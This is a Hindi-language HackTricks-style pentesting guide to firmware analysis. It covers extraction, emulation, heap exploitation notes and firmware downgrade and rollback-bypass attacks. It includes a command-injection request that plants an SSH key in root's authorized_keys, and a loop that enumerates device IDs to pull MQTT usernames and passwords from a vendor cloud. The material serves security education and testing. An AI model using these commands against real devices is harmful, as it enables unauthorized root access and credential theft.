# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **परिचय**

### संबंधित संसाधन

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ऐसा आवश्यक software है जो hardware components और उपयोगकर्ताओं के साथ इंटरैक्ट करने वाले software के बीच communication को प्रबंधित और सुगम बनाकर devices को सही ढंग से काम करने में सक्षम बनाता है। इसे permanent memory में संग्रहित किया जाता है, ताकि device चालू होते ही महत्वपूर्ण निर्देशों तक पहुँच सके और operating system शुरू हो सके। Security vulnerabilities की पहचान करने के लिए firmware की जाँच करना और उसमें संभावित बदलाव करना एक महत्वपूर्ण कदम है।<sup>[[2]](#references)[[3]](#references)</sup>

## **जानकारी एकत्र करना**

**जानकारी एकत्र करना** किसी device की संरचना और उसमें इस्तेमाल की गई technologies को समझने का एक महत्वपूर्ण शुरुआती कदम है। इस प्रक्रिया में निम्नलिखित जानकारी जुटाई जाती है:

- CPU architecture और उस पर चलने वाला operating system
- Bootloader की विशेषताएँ
- Hardware layout और datasheets
- Codebase के metrics और source locations
- External libraries और license के प्रकार
- Update histories और regulatory certifications
- Architectural और flow diagrams
- Security assessments और पहचानी गई vulnerabilities

इस काम के लिए **open-source intelligence (OSINT)** tools बहुत उपयोगी होते हैं। उपलब्ध open-source software components का manual और automated review के ज़रिए विश्लेषण भी उतना ही उपयोगी है। [Coverity Scan](https://scan.coverity.com) और [Semmle’s LGTM](https://lgtm.com/#explore) जैसे tools मुफ़्त static analysis देते हैं, जिनका उपयोग संभावित समस्याएँ ढूँढ़ने के लिए किया जा सकता है।

## **Firmware प्राप्त करना**

Firmware प्राप्त करने के कई तरीके हैं, जिनमें से हर एक की जटिलता का स्तर अलग-अलग है:

- स्रोत से **सीधे** (developers, manufacturers)
- दिए गए निर्देशों के अनुसार **बनाकर**
- आधिकारिक support sites से **download करके**
- Hosted firmware files ढूँढ़ने के लिए **Google dork** queries का उपयोग करके
- [S3Scanner](https://github.com/sa7mon/S3Scanner) जैसे tools से **cloud storage** तक सीधे पहुँचकर
- Man-in-the-middle techniques से **updates** intercept करके
- **UART**, **JTAG** या **PICit** जैसे connections के ज़रिए device से **extract करके**
- Device communication में update requests को **sniff करके**
- **Hardcoded update endpoints** की पहचान करके और उनका उपयोग करके
- Bootloader या network से **dump करके**
- बाकी सभी तरीके विफल होने पर, उपयुक्त hardware tools का उपयोग करके storage chip को **निकालकर और पढ़कर**

### सिर्फ़ UART logs: flash में U-Boot env के ज़रिए root shell force करना

अगर UART RX को अनदेखा किया जाता है (सिर्फ़ logs मिलते हैं), तो भी आप offline **U-Boot environment blob को edit करके** init shell force कर सकते हैं:<sup>[[6]](#references)</sup>

1. SOIC-8 clip और programmer (3.3V) से SPI flash dump करें:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env partition का पता लगाएँ, `bootargs` को संपादित करके उसमें `init=/bin/sh` जोड़ें, और blob के लिए **U-Boot env CRC32 फिर से गणना करें**।
3. केवल env partition को दोबारा flash करें और reboot करें; UART पर shell दिखाई देना चाहिए।

यह उन embedded devices पर उपयोगी है जहाँ bootloader shell disabled है, लेकिन बाहरी flash access के ज़रिए env partition में लिखा जा सकता है।

## firmware का विश्लेषण

अब जबकि आपके पास **firmware है**, तो आपको यह जानने के लिए उससे जानकारी निकालनी होगी कि उसके साथ कैसे काम करना है। इसके लिए आप अलग-अलग tools का उपयोग कर सकते हैं:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

अगर आपको उन tools से ज़्यादा कुछ न मिले, तो `binwalk -E <bin>` से image की **entropy** जाँचें। अगर entropy कम है, तो संभवतः यह encrypted नहीं है। अगर entropy ज़्यादा है, तो संभवतः यह encrypted है (या किसी तरह compressed है)।

इसके अलावा, **firmware के अंदर embedded files** extract करने के लिए आप इन tools का उपयोग कर सकते हैं:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

या file का निरीक्षण करने के लिए [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) का उपयोग कर सकते हैं।

### Filesystem प्राप्त करना

पहले बताए गए tools, जैसे `binwalk -ev <bin>`, से आप **filesystem extract** कर पाए होंगे।\
Binwalk आमतौर पर इसे **filesystem के प्रकार के नाम वाले folder** में extract करता है। आमतौर पर ये प्रकार होते हैं: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs।

#### Manual Filesystem Extraction

कभी-कभी binwalk के signatures में filesystem का **magic byte** नहीं होता। ऐसे मामलों में, binwalk का उपयोग करके **filesystem का offset ढूँढें और binary से compressed filesystem carve करें**, फिर नीचे दिए गए steps के अनुसार उसके प्रकार के आधार पर filesystem को **manually extract** करें।

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs filesystem की carving के लिए निम्नलिखित **dd command** चलाएँ।

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

वैकल्पिक रूप से, निम्न कमांड भी चलाया जा सकता है।

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs के लिए (ऊपर दिए गए उदाहरण में इस्तेमाल किया गया)

`$ unsquashfs dir.squashfs`

इसके बाद फ़ाइलें "`squashfs-root`" डायरेक्टरी में होंगी।

- CPIO archive फ़ाइलें

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 फ़ाइल सिस्टम के लिए

`$ jefferson rootfsfile.jffs2`

- NAND flash वाले ubifs फ़ाइल सिस्टम के लिए

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware का विश्लेषण

Firmware प्राप्त होने के बाद, उसकी संरचना और संभावित कमजोरियों को समझने के लिए उसका विश्लेषण करना आवश्यक है। इस प्रक्रिया में firmware image से मूल्यवान डेटा का विश्लेषण और निष्कर्षण करने के लिए विभिन्न टूल का उपयोग किया जाता है।

### प्रारंभिक विश्लेषण के टूल

बाइनरी फ़ाइल (जिसे `<bin>` कहा गया है) की प्रारंभिक जाँच के लिए कमांड का एक सेट दिया गया है। ये कमांड फ़ाइल के प्रकार पहचानने, strings निकालने, बाइनरी डेटा का विश्लेषण करने और partition तथा फ़ाइल सिस्टम के विवरण समझने में मदद करते हैं:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

इमेज की encryption स्थिति का आकलन करने के लिए, `binwalk -E <bin>` से **entropy** जाँची जाती है। कम entropy encryption की कमी का संकेत देती है, जबकि अधिक entropy संभावित encryption या compression दर्शाती है।

**Embedded files** निकालने के लिए, **file-data-carving-recovery-tools** documentation और फ़ाइल निरीक्षण के लिए **binvis.io** जैसे टूल और संसाधनों की सिफारिश की जाती है।

### Filesystem निकालना

`binwalk -ev <bin>` का उपयोग करके आमतौर पर filesystem निकाला जा सकता है, अक्सर filesystem के प्रकार (जैसे squashfs, ubifs) के नाम वाली directory में। हालाँकि, जब **binwalk** magic bytes न होने के कारण filesystem का प्रकार पहचानने में विफल रहता है, तो मैन्युअल रूप से निकालना आवश्यक होता है। इसमें filesystem का offset ढूँढ़ने के लिए `binwalk` का उपयोग करना और फिर filesystem को carve out करने के लिए `dd` command चलाना शामिल है:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

इसके बाद, filesystem के प्रकार (जैसे squashfs, cpio, jffs2, ubifs) के आधार पर, contents को manually extract करने के लिए अलग-अलग commands का उपयोग किया जाता है।

### Filesystem Analysis

Filesystem extract होने के बाद, security flaws की खोज शुरू होती है। असुरक्षित network daemons, hardcoded credentials, API endpoints, update server की functionality, uncompiled code, startup scripts और offline analysis के लिए compiled binaries पर ध्यान दिया जाता है।

जाँचने के लिए **मुख्य स्थानों** और **items** में शामिल हैं:

- User credentials के लिए **etc/shadow** और **etc/passwd**
- **etc/ssl** में SSL certificates और keys
- संभावित vulnerabilities के लिए configuration और script files
- आगे के analysis के लिए embedded binaries
- आम IoT device web servers और binaries

Filesystem में sensitive information और vulnerabilities का पता लगाने में कई tools मदद करते हैं:

- Sensitive information खोजने के लिए [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) और [**Firmwalker**](https://github.com/craigz28/firmwalker)
- व्यापक firmware analysis के लिए [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Static और dynamic analysis के लिए [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), और [**EMBA**](https://github.com/e-m-b-a/emba)

### Compiled Binaries पर Security Checks

Filesystem में मिली source code और compiled binaries—दोनों की vulnerabilities के लिए जाँच होनी चाहिए। Unix binaries के लिए **checksec.sh** और Windows binaries के लिए **PESecurity** जैसे tools, ऐसे unprotected binaries की पहचान करने में मदद करते हैं जिनका exploit किया जा सकता है।

## Derived URL Tokens के ज़रिए Cloud Config और MQTT Credentials हासिल करना

कई IoT hubs प्रति-device configuration को ऐसे cloud endpoint से fetch करते हैं:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analysis के दौरान, आपको पता चल सकता है कि `<token>` को hardcoded secret का उपयोग करके device ID से स्थानीय रूप से derive किया जाता है, उदाहरण के लिए:

- token = MD5( deviceId || STATIC_KEY ), जिसे uppercase hex के रूप में दर्शाया जाता है

इस design से deviceId और STATIC_KEY जानने वाला कोई भी व्यक्ति URL को reconstruct करके cloud config प्राप्त कर सकता है, जिससे अक्सर plaintext MQTT credentials और topic prefixes उजागर हो जाते हैं।

व्यावहारिक कार्यप्रवाह:

1) UART boot logs से deviceId निकालें

- 3.3V UART adapter (TX/RX/GND) कनेक्ट करें और logs capture करें:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- cloud config URL pattern और broker address प्रिंट करने वाली पंक्तियाँ खोजें, उदाहरण के लिए:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) firmware से STATIC_KEY और token algorithm प्राप्त करें

- Binaries को Ghidra/radare2 में लोड करें और config path ("/pf/") या MD5 usage खोजें।
- Algorithm की पुष्टि करें (जैसे, MD5(deviceId||STATIC_KEY))।
- Bash में token निकालें और digest को uppercase करें:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) क्लाउड कॉन्फ़िगरेशन और MQTT credentials इकट्ठा करें

- URL तैयार करें और curl से JSON प्राप्त करें; secrets निकालने के लिए jq से parse करें:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Plaintext MQTT और weak topic ACLs का दुरुपयोग करें (यदि मौजूद हों)

- प्राप्त credentials का उपयोग करके maintenance topics को subscribe करें और sensitive events देखें:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) अनुमानित device IDs की सूची बनाएँ (बड़े पैमाने पर, अनुमति के साथ)

- कई ecosystems में vendor OUI/product/type bytes के बाद एक sequential suffix होता है।
- आप candidate IDs को iterate कर सकते हैं, tokens derive कर सकते हैं और programmatically configs fetch कर सकते हैं:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

नोट्स
- बड़े पैमाने पर enumeration करने से पहले हमेशा स्पष्ट अनुमति लें।
- जब संभव हो, target hardware में बदलाव किए बिना secrets recover करने के लिए emulation या static analysis को प्राथमिकता दें।

Firmware को emulate करने की प्रक्रिया से किसी device के operation या किसी individual program का **dynamic analysis** संभव होता है। इस तरीके में hardware या architecture dependencies से जुड़ी चुनौतियाँ आ सकती हैं, लेकिन root filesystem या specific binaries को समान architecture और endianness वाले device, जैसे Raspberry Pi, या पहले से बनी virtual machine में transfer करने से आगे की testing में मदद मिल सकती है।

### Individual Binaries को Emulate करना

एकल programs की जाँच करते समय, program की endianness और CPU architecture की पहचान करना महत्वपूर्ण है।

#### MIPS Architecture का उदाहरण

MIPS architecture binary को emulate करने के लिए, यह command इस्तेमाल की जा सकती है:

```bash
file ./squashfs-root/bin/busybox
```

और आवश्यक emulation tools इंस्टॉल करने के लिए:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS (big-endian) के लिए `qemu-mips` का उपयोग किया जाता है, और little-endian binaries के लिए `qemu-mipsel` उपयुक्त होगा।

#### ARM Architecture Emulation

ARM binaries के लिए प्रक्रिया समान है; emulation के लिए `qemu-arm` emulator का उपयोग किया जाता है।

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) जैसे tools पूर्ण firmware emulation को सक्षम करते हैं, प्रक्रिया को automate करते हैं और dynamic analysis में सहायता करते हैं।

## Dynamic Analysis in Practice

इस चरण में analysis के लिए वास्तविक या emulated device environment का उपयोग किया जाता है। OS और filesystem तक shell access बनाए रखना आवश्यक है। हो सकता है कि emulation hardware interactions की हूबहू नकल न करे, इसलिए कभी-कभी emulation को फिर से शुरू करना पड़ सकता है। Analysis में filesystem की दोबारा जाँच करनी चाहिए, exposed webpages और network services का exploit करना चाहिए, और bootloader vulnerabilities की जाँच करनी चाहिए। संभावित backdoor vulnerabilities की पहचान के लिए firmware integrity tests महत्वपूर्ण हैं।

## Runtime Analysis Techniques

Runtime analysis में किसी process या binary के operating environment में उसके साथ interaction करना शामिल है। इसके लिए breakpoints सेट करने और fuzzing तथा अन्य techniques के ज़रिए vulnerabilities पहचानने हेतु gdb-multiarch, Frida और Ghidra जैसे tools का उपयोग किया जाता है।

Full debugger के बिना embedded targets के लिए, device पर **statically-linked `gdbserver` की copy करें** और remotely attach करें:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor संदेश मैपिंग

IoT hubs में RF stack अक्सर **radio MCU** और Linux userland process के बीच विभाजित होता है। एक उपयोगी workflow है इस path को map करना:<sup>[[8]](#references)</sup>

1. हवा में **RF frame**
2. radio MCU पर **controller-side parser**
3. Linux को forward किया गया **serial/UART text या TLV protocol** (उदाहरण के लिए `/dev/tty*`)
4. मुख्य daemon में **application dispatcher**
5. **protocol-specific handler / state machine**

इस architecture में एक के बजाय दो reversing targets बनते हैं। यदि controller binary radio frames को `Group,Command,arg1,arg2,...` जैसे textual protocol में बदलता है, तो इनकी जानकारी निकालें:

- **message groups** और dispatch tables
- कौन-से messages **network** से आ सकते हैं और कौन-से controller से ही
- सटीक **manufacturer-specific discriminator fields** (उदाहरण के लिए Zigbee `manufacturer_code` और custom `cluster_command`)
- कौन-से handlers केवल **commissioning**, discovery, या firmware/model download phases के दौरान ही reachable होते हैं

विशेष रूप से Zigbee के लिए, pairing traffic capture करें और जाँचें कि क्या target अब भी default **Link Key** `ZigBeeAlliance09` पर निर्भर करता है। यदि ऐसा है, तो commissioning traffic sniff करने से **Network Key** उजागर हो सकती है। Zigbee 3.0 install codes इस exposure को कम करते हैं, इसलिए नोट करें कि जाँचा गया device वास्तव में उन्हें enforce करता है या नहीं।

### Manufacturer-specific protocol handlers और FSM-gated reachability

Vendor-specific Zigbee/ZCL commands अक्सर standardized clusters से बेहतर target होते हैं, क्योंकि वे कम battle-tested validation वाले **custom parsing code** और internal **FSMs** तक पहुँचते हैं।<sup>[[8]](#references)</sup>

व्यावहारिक workflow:

- Command dispatcher को reverse करें, जब तक **vendor-only handler** न मिल जाए।
- **FSM state**, **event**, **check**, **action**, और **next-state** tables की जानकारी निकालें।
- उन **transitional states** की पहचान करें जो अपने-आप आगे बढ़ती हैं, और उन retry/error branches की भी जो अंततः attacker-controlled state को reset या free करती हैं।
- यह मानने के बजाय कि buggy handler हमेशा reachable है, पुष्टि करें कि daemon को vulnerable state में लाने के लिए कौन-से वैध protocol exchanges ज़रूरी हैं।

Timing-sensitive protocols के लिए, Python framework से packet replay करना बहुत धीमा हो सकता है। अधिक भरोसेमंद तरीका है vendor-grade stack वाले real hardware (उदाहरण के लिए **nRF52840**) पर किसी वैध device का emulation करना, ताकि सही **endpoints**, **attributes**, और commissioning timing उजागर किए जा सकें।

### Embedded daemons में fragmented-download bug class

एक बार-बार दिखने वाली firmware bug class **fragmented blob/model/configuration downloads** में पाई जाती है:<sup>[[8]](#references)</sup>

1. **पहला fragment** (`offset == 0`) `ctx->total_size` को store करता है और `malloc(total_size)` allocate करता है।
2. बाद के fragments केवल attacker-controlled **packet-local** fields की जाँच करते हैं, जैसे `packet_total_size >= offset + chunk_len`।
3. Copy में `memcpy(&ctx->buffer[offset], chunk, chunk_len)` का उपयोग होता है, लेकिन इसे **original allocated size** के विरुद्ध जाँचा नहीं जाता।

इससे attacker ये कर सकता है:

- छोटा heap allocation कराने के लिए **छोटे** declared total size वाला पहला वैध fragment भेजना।
- बाद में **expected offset**, लेकिन बड़ा `chunk_len` वाला fragment भेजना।
- ऐसा forged packet-local size देना जो नई checks को पूरा करे, लेकिन फिर भी मूल रूप से allocate किए गए buffer को overflow कर दे।

जब vulnerable path commissioning logic के पीछे हो, तब exploit करने के लिए malformed fragments भेजने से पहले target को अपेक्षित model-download या blob-download state में लाने जितना **device emulation** शामिल करना ज़रूरी है।

### Protocol-driven `free()` triggers

Embedded daemons में heap metadata exploitation trigger करने का सबसे आसान तरीका अक्सर "cleanup का इंतज़ार करना" नहीं, बल्कि **protocol के अपने error handling को मजबूर करना** होता है:<sup>[[8]](#references)</sup>

- FSM को **retry** या **error** states में धकेलने के लिए malformed follow-up fragments भेजें।
- Retry threshold पार करें, ताकि daemon **context reset** करे और corrupted buffer को free कर दे।
- Process के अन्य कारणों से crash होने से पहले allocator-side primitives trigger करने के लिए इस अनुमानित `free()` का उपयोग करें।

यह embedded Linux में **musl/uClibc/dlmalloc-like** allocators के विरुद्ध विशेष रूप से उपयोगी है, जहाँ chunk metadata को corrupt करने से unlink/unbin logic write primitive में बदल सकता है। एक स्थिर तरीका यह है कि **size field** को corrupt करके allocator traversal को overflowed buffer के भीतर staged **fake chunks** की ओर मोड़ा जाए, बजाय इसके कि real bin pointers को तुरंत clobber करके process crash कर दिया जाए।

## Binary Exploitation और Proof-of-Concept

पहचानी गई vulnerabilities के लिए PoC विकसित करने हेतु target architecture की गहरी समझ और lower-level languages में programming की आवश्यकता होती है। Embedded systems में binary runtime protections दुर्लभ हैं, लेकिन मौजूद होने पर Return Oriented Programming (ROP) जैसी techniques ज़रूरी हो सकती हैं।

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc, glibc जैसे fastbins का उपयोग करता है। बाद में होने वाला बड़ा allocation `__malloc_consolidate()` को trigger कर सकता है, इसलिए किसी भी fake chunk को checks पास करनी होंगी (उचित size, `fd = 0`, और आसपास के chunks का "in use" दिखना)।<sup>[[6]](#references)</sup>
- **ASLR के तहत non-PIE binaries:** यदि ASLR enabled है, लेकिन main binary **non-PIE** है, तो binary के भीतर `.data/.bss` addresses स्थिर रहते हैं। आप ऐसी region target कर सकते हैं जो पहले से ही valid heap chunk header जैसी दिखती हो, ताकि fastbin allocation **function pointer table** पर हो।
- **Parser-stopping NUL:** JSON parse करते समय payload में `\x00` parsing रोक सकता है, जबकि stack pivot/ROP chain के लिए attacker-controlled trailing bytes बने रहते हैं।
- **`/proc/self/mem` के ज़रिए Shellcode:** `open("/proc/self/mem")`, `lseek()`, और `write()` call करने वाली ROP chain किसी ज्ञात mapping में executable shellcode रख सकती है और उस पर jump कर सकती है।

## Firmware Analysis के लिए तैयार Operating Systems

[AttifyOS](https://github.com/adi0x90/attifyos) और [EmbedOS](https://github.com/scriptingxss/EmbedOS) जैसे operating systems, firmware security testing के लिए ज़रूरी tools से लैस pre-configured environments प्रदान करते हैं।

## Firmware का विश्लेषण करने के लिए तैयार OSs

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS एक distro है, जिसका उद्देश्य Internet of Things (IoT) devices का security assessment और penetration testing करने में आपकी मदद करना है। यह सभी ज़रूरी tools वाला pre-configured environment उपलब्ध कराकर आपका काफी समय बचाता है।
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 पर आधारित embedded security testing operating system, जिसमें firmware security testing tools पहले से loaded हैं।

## Firmware Downgrade Attacks और Insecure Update Mechanisms

भले ही कोई vendor firmware images के लिए cryptographic signature checks लागू करता हो, **version rollback (downgrade) protection अक्सर शामिल नहीं होती**। जब boot- या recovery-loader केवल embedded public key से signature verify करता है, लेकिन flash किए जा रहे image के *version* (या monotonic counter) की तुलना नहीं करता, तो attacker वैध रूप से **पुराना, vulnerable firmware—जिस पर अब भी valid signature मौजूद हो—install कर सकता है** और इस तरह patched vulnerabilities को फिर से ला सकता है।<sup>[[4]](#references)</sup>

आम attack workflow:

1. **पुराना signed image प्राप्त करें**
   * इसे vendor के public download portal, CDN या support site से लें।
   * इसे companion mobile/desktop applications से निकालें (उदाहरण के लिए Android APK के अंदर `assets/firmware/`)।
   * इसे VirusTotal, Internet archives, forums आदि जैसी third-party repositories से प्राप्त करें।
2. किसी भी exposed update channel के ज़रिए image को device पर **upload करें या उपलब्ध कराएँ**:
   * Web UI, mobile-app API, USB, TFTP, MQTT आदि।
   * कई consumer IoT devices में *unauthenticated* HTTP(S) endpoints होते हैं, जो Base64-encoded firmware blobs स्वीकार करते हैं, उन्हें server-side decode करते हैं और recovery/upgrade शुरू करते हैं।
3. Downgrade के बाद, उस vulnerability का exploit करें जिसे नए release में patch किया गया था (उदाहरण के लिए बाद में जोड़ा गया command-injection filter)।
4. Persistence मिलने के बाद पहचान से बचने के लिए, वैकल्पिक रूप से latest image को फिर से flash करें या updates disable करें।

### उदाहरण: Downgrade के बाद Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

असुरक्षित (downgraded) firmware में, `md5` parameter को बिना sanitisation के सीधे shell command में जोड़ दिया जाता है, जिससे मनमाने commands inject किए जा सकते हैं (यहाँ—SSH key-based root access सक्षम करने के लिए)। बाद के firmware versions में एक बुनियादी character filter जोड़ा गया, लेकिन downgrade protection न होने के कारण यह fix बेअसर है।<sup>[[4]](#references)</sup>

### Mobile Apps से Firmware निकालना

कई vendors अपने companion mobile applications में पूरी firmware images शामिल करते हैं, ताकि app Bluetooth/Wi-Fi के ज़रिए device को update कर सके। ये packages आमतौर पर APK/APEX में `assets/fw/` या `res/raw/` जैसे paths पर unencrypted रूप में stored होते हैं। `apktool`, `ghidra` या साधारण `unzip` जैसे tools की मदद से physical hardware को छुए बिना signed images निकाली जा सकती हैं।<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot designs में केवल updater तक सीमित anti-rollback bypass

कुछ vendors anti-downgrade **ratchet** लागू करते हैं, लेकिन केवल *updater* logic के भीतर (उदाहरण के लिए, CAN पर UDS routine, recovery command या userspace OTA agent)। अगर **bootloader** बाद में केवल image signature/CRC जाँचता है और partition table या slot metadata पर भरोसा करता है, तो rollback protection को फिर भी bypass किया जा सकता है।<sup>[[7]](#references)</sup>

आम तौर पर कमज़ोर design:

- Firmware metadata में version descriptor और **security ratchet** / monotonic counter, दोनों होते हैं।
- Updater image ratchet की तुलना persistent storage में रखी value से करता है और पुराने signed images को अस्वीकार करता है।
- **Bootloader** उस ratchet को parse नहीं करता और चुने गए slot से boot करने से पहले केवल header, CRC और signature verify करता है।
- Slot activation को partition table या per-slot generation counter में अलग से store किया जाता है और उसे validate किए गए exact firmware digest से **cryptographically bind नहीं** किया जाता।

Dual-slot systems में इससे **एक image validate करके दूसरी image boot करने** का primitive बनता है। अगर attacker updater से current signed image के ज़रिए slot B को अगला boot target mark करवा सके और reboot से पहले slot B को overwrite कर सके, तो bootloader downgraded image boot कर सकता है, क्योंकि वह केवल पहले से committed slot metadata पर भरोसा करता है।

आम दुरुपयोग का तरीका:

1. Passive slot में **current signed** firmware upload करें और सामान्य validation/switch routine चलाएँ, ताकि layout उस slot को अगला active slot mark करे।
2. **अभी reboot न करें**। उसी session में slot-preparation/erase routine फिर से चलाएँ।
3. पुराने boot-state या slot-selection logic का दुरुपयोग करें, ताकि updater उसी **physical slot** को erase करे जिसे अभी promote किया गया था।
4. उस slot में **पुराना, लेकिन अब भी signed** firmware लिखें।
5. Ratchet लागू करने वाली validation routine को छोड़ें और सीधे reboot करें।
6. Bootloader promoted slot चुनता है, केवल signature/integrity verify करता है और पुरानी image boot कर देता है।

A/B update implementations को reverse करते समय इन बातों पर ध्यान दें:

- Slot selection, **boot-time flags** से निकाला जाता है जिन्हें सफल switch के बाद refresh नहीं किया जाता।
- `prepare_passive_slot()` जैसी routine, **मौजूदा committed layout** के बजाय पुराने state के आधार पर slot erase करती है।
- `part_write_layout()` जैसा function केवल **generation counter** / active flag बढ़ाता है और validated image hash store नहीं करता।
- Ratchet checks userspace या updater code में लागू हैं, लेकिन ROM / bootloader / secure boot stages में **नहीं** हैं।
- Erase या recovery routines, slot का content हटाकर फिर से लिखे जाने के बाद भी उसे bootable mark रहने देती हैं।

### Update Logic का आकलन करने के लिए Checklist

* क्या *update endpoint* का transport/authentication पर्याप्त रूप से सुरक्षित है (TLS + authentication)?
* क्या device flashing से पहले **version numbers** या **monotonic anti-rollback counter** की तुलना करता है?
* क्या image को secure boot chain के भीतर verify किया जाता है (उदाहरण के लिए, ROM code द्वारा signatures जाँचे जाते हैं)?
* क्या **bootloader**, केवल signature/CRC जाँचने के बजाय, updater वाला ही ratchet लागू करता है?
* क्या slot activation metadata को **validated firmware digest/version से bind** किया गया है, या promotion के बाद slot को modify किया जा सकता है?
* Slot switch सफल होने के बाद क्या device को reboot करना अनिवार्य है, या उसी session में आगे की update/erase routines अब भी उपलब्ध रहती हैं?
* क्या userland code अतिरिक्त sanity checks करता है (उदाहरण के लिए, allowed partition map, model number)?
* क्या *partial* या *backup* update flows वही validation logic दोबारा इस्तेमाल करते हैं?

> 💡  अगर ऊपर दी गई कोई भी चीज़ मौजूद नहीं है, तो platform संभवतः rollback attacks के प्रति vulnerable है।

## अभ्यास के लिए vulnerable firmware

Firmware में vulnerabilities ढूँढ़ने का अभ्यास करने के लिए, शुरुआत में इन vulnerable firmware projects का उपयोग करें।

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

